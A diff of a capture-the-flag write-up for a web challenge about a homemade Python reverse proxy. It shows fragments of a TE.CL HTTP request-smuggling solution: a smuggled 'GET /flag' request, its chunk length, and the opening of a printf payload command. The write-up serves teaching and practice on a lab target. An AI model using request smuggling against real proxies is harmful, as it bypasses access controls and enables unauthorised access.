@@ -17,6 +17,7 @@ image: /assets/img/categories/web.svg
 
 > **Category:** Web  
 > **Prompt:** I had some free time and started building a little reverse proxy in python, just for the fun of it. But man HTTP/1 is weird. Anyway, I think my proxy mostly works and it allowed me to skip implementing authentication on my server cause I can just block routes there. Pretty cool, no?
+
 > **Artifact:** [⬇️ web.http1mustdie.zip](/assets/file/writeup/HTTP-1-must-die/web.http1mustdie.zip?raw=1)  
 > **Flag format:** `PP{...}`
 
@@ -82,9 +83,9 @@ Why it bypasses the filter: the proxy’s “flag” check inspects only the **o
 
 3. **Smuggle via TE.CL:**  
    The smuggled request is `GET /flag HTTP/1.1
-Host: a
+   Host: a
 
-` (length = **31 = 0x1f**).  
+   ` (length = **31 = 0x1f**).  
    Send this single‑packet payload:
    ```bash
    printf 'POST / HTTP/1.1
